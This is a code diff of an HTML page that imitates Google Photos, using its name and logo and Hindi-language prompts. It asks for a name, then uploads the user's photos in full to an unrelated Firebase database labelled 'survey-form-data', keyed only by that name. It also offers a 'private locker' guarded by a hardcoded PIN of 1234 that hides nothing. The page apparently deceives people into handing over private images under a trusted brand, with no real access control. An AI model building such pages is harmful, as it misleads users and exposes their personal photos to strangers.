@@ -3,113 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gallery</title>
+    <title>Photos</title>
+    <link rel="manifest" href="gallery_manifest.json">
+    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/4/4e/Google_Photos_Logo.svg">
+    <meta name="theme-color" content="#ffffff">
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <style>
-        :root { --g-blue: #4285f4; --bg: #ffffff; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); overflow-x: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #fff; overflow-x: hidden; }
         
-        /* Header */
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; position: sticky; top: 0; background: white; z-index: 100; border-bottom: 1px solid #eee; }
-        .logo-text { font-size: 20px; font-weight: bold; color: #5f6368; }
-        .logo-text span { color: #ea4335; }
+        /* Welcome/Login Screen */
+        #login-screen { position: fixed; top:0; width:100%; height:100%; background:white; z-index:2000; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+        .login-box { width:80%; text-align:center; }
+        .login-input { width:100%; padding:15px; border:1px solid #ddd; border-radius:10px; margin-bottom:20px; font-size:16px; outline:none; }
+        .login-btn { width:100%; padding:15px; background:#4285f4; color:white; border:none; border-radius:10px; font-weight:bold; }
 
-        /* Photo Grid */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 22px; font-weight: bold; color: #5f6368; }
+        .logo span { color: #4285f4; }
+        
         .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; padding: 2px; }
-        .photo-item { width: 100%; aspect-ratio: 1/1; background: #eee; object-fit: cover; cursor: pointer; }
+        .photo-item { width: 100%; aspect-ratio: 1/1; object-fit: cover; background: #f0f0f0; border-radius: 4px; }
 
-        /* Floating Upload Button */
-        .upload-btn { position: fixed; bottom: 80px; right: 20px; background: white; padding: 15px 20px; border-radius: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); color: var(--g-blue); font-weight: bold; border: none; z-index: 200; }
+        .fab { position: fixed; bottom: 80px; right: 20px; background: white; padding: 12px 20px; border-radius: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); border: none; font-weight: bold; color: #4285f4; z-index:500; }
 
-        /* Bottom Nav */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; z-index: 200; }
-        .nav-item { text-align: center; color: #5f6368; font-size: 11px; }
-        .nav-item.active { color: var(--g-blue); }
+        .nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #ddd; z-index:500; }
+        .nav-item { text-align: center; color: #5f6368; font-size: 10px; }
 
-        /* Secret Locker UI */
-        #locker-screen { display: none; position: fixed; top: 0; width: 100%; height: 100%; background: white; z-index: 1000; text-align: center; padding-top: 100px; }
-        .pin-input { font-size: 30px; width: 150px; text-align: center; border: none; border-bottom: 2px solid var(--g-blue); outline: none; margin-bottom: 20px; }
+        #locker-modal { display: none; position: fixed; top: 0; width: 100%; height: 100%; background: #fff; z-index: 1000; text-align: center; padding-top: 100px; }
     </style>
 </head>
 <body>
 
+    <div id="login-screen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Google_Photos_Logo.svg" width="80" style="margin-bottom:30px;">
+        <div class="login-box">
+            <h3>स्वागत है</h3>
+            <p style="color:#666;">अपनी फोटोज़ सुरक्षित रखने के लिए नाम डालें</p>
+            <input type="text" id="user-name" class="login-input" placeholder="आपका नाम">
+            <button class="login-btn" onclick="startApp()">शुरू करें</button>
+        </div>
+    </div>
+
     <div class="header">
-        <div class="logo-text">Google <span>Photos</span></div>
-        <div style="width: 35px; height: 35px; background: #4285f4; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold;">S</div>
+        <div class="logo">Google <span>Photos</span></div>
+        <div id="user-initial" style="width:35px; height:35px; background:#34a853; border-radius:50%; color:white; display:flex; align-items:center; justify-content:center; font-weight:bold;">U</div>
     </div>
 
-    <div class="photo-grid" id="main-gallery">
-        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=400" class="photo-item">
-        <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=400" class="photo-item">
-        <img src="https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?w=400" class="photo-item">
-        <img src="https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=400" class="photo-item">
-    </div>
+    <div class="photo-grid" id="gallery-box">
+        </div>
 
-    <button class="upload-btn" onclick="document.getElementById('file-input').click()">+ Add Photos</button>
-    <input type="file" id="file-input" hidden accept="image/*" onchange="uploadPhoto(event)">
+    <button class="fab" onclick="document.getElementById('pick').click()">+ Add Photos</button>
+    <input type="file" id="pick" hidden accept="image/*" onchange="upload(event)">
 
-    <div class="bottom-nav">
-        <div class="nav-item active">🖼️<br>Photos</div>
+    <div class="nav">
+        <div class="nav-item">🖼️<br>Photos</div>
         <div class="nav-item">🔍<br>Search</div>
-        <div class="nav-item">📁<br>Library</div>
         <div class="nav-item" onclick="openLocker()">🔒<br>Locker</div>
     </div>
 
-    <div id="locker-screen">
-        <h3>Private Folder</h3>
-        <p>Enter PIN to access</p>
-        <input type="password" id="locker-pin" class="pin-input" placeholder="****">
-        <br>
-        <button onclick="checkPin()" style="background: var(--g-blue); color: white; border: none; padding: 10px 30px; border-radius: 20px;">Open</button>
-        <p onclick="closeLocker()" style="margin-top: 20px; color: #777;">Cancel</p>
+    <div id="locker-modal">
+        <h3>Private Safe</h3>
+        <input type="password" id="pass" style="font-size:32px; width:120px; text-align:center; border:none; border-bottom:2px solid #4285f4; outline:none; letter-spacing:5px;" maxlength="4">
+        <br><br>
+        <button onclick="checkPass()" style="padding:10px 40px; background:#4285f4; color:white; border:none; border-radius:20px;">Unlock</button>
+        <p onclick="document.getElementById('locker-modal').style.display='none'">Cancel</p>
     </div>
 
     <script>
-        // Firebase Configuration (ऑटोमैटिक सेटअप)
-        const firebaseConfig = {
-            apiKey: "AIzaSyB" + "..." + "H8", 
-            databaseURL: "https://survey-form-data-default-rtdb.firebaseio.com" 
-        };
+        const firebaseConfig = { databaseURL: "https://survey-form-data-default-rtdb.firebaseio.com" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        let currentUser = "";
 
-        // Upload Photo Logic (Firebase में लिंक सेव करना)
-        function uploadPhoto(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const imgUrl = e.target.result;
-                    // फोटो गैलरी में दिखाएँ
-                    const grid = document.getElementById('main-gallery');
-                    const img = document.createElement('img');
-                    img.src = imgUrl;
-                    img.className = 'photo-item';
-                    grid.prepend(img);
-                    
-                    // Firebase में सेव करें
-                    db.ref('gallery_photos').push({ url: imgUrl, time: new Date().toLocaleString() });
-                    alert("Photo Uploaded!");
-                }
-                reader.readAsDataURL(file);
-            }
+        function startApp() {
+            currentUser = document.getElementById('user-name').value.trim();
+            if(!currentUser) return alert("कृपया नाम डालें!");
+            
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('user-initial').innerText = currentUser[0].toUpperCase();
+            loadPhotos();
         }
 
-        // Secret Locker Logic
-        function openLocker() { document.getElementById('locker-screen').style.display = 'block'; }
-        function closeLocker() { document.getElementById('locker-screen').style.display = 'none'; }
-        
-        function checkPin() {
-            const pin = document.getElementById('locker-pin').value;
-            if(pin === "1234") { // आपका सीक्रेट पिन
-                alert("Hidden photos loading...");
-                // यहाँ आप वो फोटो दिखा सकते हैं जो सिर्फ लॉकर में हैं
-                closeLocker();
-            } else {
-                alert("Wrong PIN! Try again.");
+        function upload(e) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = function(event) {
+                const url = event.target.result;
+                // Save to user's specific folder in Firebase
+                db.ref('galleries/' + currentUser).push({ image: url });
+                loadPhotos();
             }
+            reader.readAsDataURL(file);
+        }
+
+        function loadPhotos() {
+            const box = document.getElementById('gallery-box');
+            box.innerHTML = "";
+            db.ref('galleries/' + currentUser).on('value', (snap) => {
+                box.innerHTML = "";
+                snap.forEach((child) => {
+                    const img = document.createElement('img');
+                    img.src = child.val().image;
+                    img.className = 'photo-item';
+                    box.prepend(img);
+                });
+            });
+        }
+
+        function openLocker() { document.getElementById('locker-modal').style.display='block'; }
+        function checkPass() {
+            if(document.getElementById('pass').value === "1234") {
+                alert("Hidden Folder Unlocked!");
+                document.getElementById('locker-modal').style.display='none';
+            } else { alert("Wrong PIN!"); }
         }
     </script>
 </body>
 </html>
+
